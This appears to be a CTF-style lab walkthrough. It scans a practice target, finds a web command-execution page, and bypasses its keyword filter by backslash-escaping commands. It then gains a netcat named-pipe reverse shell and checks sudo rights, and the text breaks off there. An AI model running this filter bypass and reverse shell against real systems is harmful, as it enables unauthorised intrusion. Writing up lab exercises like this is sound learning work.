**Target Ip :** 
```
10.49.160.137
```

-----------
# Scanning using RustScan 

```
rustscan -a 10.49.160.137 -- -sC -sV 
```

We found open ports :  
```
Open 10.49.160.137:22
Open 10.49.160.137:21
Open 10.49.160.137:80
```

These are the service running on the server :
![[Pasted image 20260209215212.png]]

There was a web service running on port 80

---
Now we are trying to find the subdomains :

```
subfinder -d http://10.49.160.137
```

![[Pasted image 20260209215314.png]]

We would not find any subdomains.

---
Now we are trying to find the directories :

```
dirsearch -u "http://10.49.160.137"
```
![[Pasted image 20260209215627.png]]

**From these we found a juicy directory :**
```
http://10.49.160.137/secret/ 
```

---
We are trying to login with ftp 
![[Pasted image 20260209223506.png]]

```
ftp 10.49.160.137 
```

we found a note.txt file. Lets download it -

```
get note.txt
```

```
cat note.txt 

Anurodh told me that there is some filtering on strings being put in the command 
-- Apaar
```

Here we got  two name : 
Anurodh 

Apaar

---
Now lets try command Injection :

If we try ls it filters the command
![[Pasted image 20260209225117.png]]

But if we use `\` with command `l\s` then it doesn't filters it.

![[Pasted image 20260209225434.png]]

But before executing the command we simply make rm > r\m .
```
r\m /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 192.168.209.139 8888 >/tmp/f
```

```
nc -lvnp 8888
```

![[Pasted image 20260209225622.png]]

Now we use the command to stabilize the shell.
```
python3 -c 'import pty; pty.spawn("/bin/bash")'
```

---
Now we go to the ==`/home/apaar`== directory.

```
sudo -l
```

![[Pasted image 20260209231214.png]]
We can use the **==`helpline.sh`==** without password.
Running .helpline.sh as Apaar with the command :

sudo -u apaar /home/apaar/.helpline.sh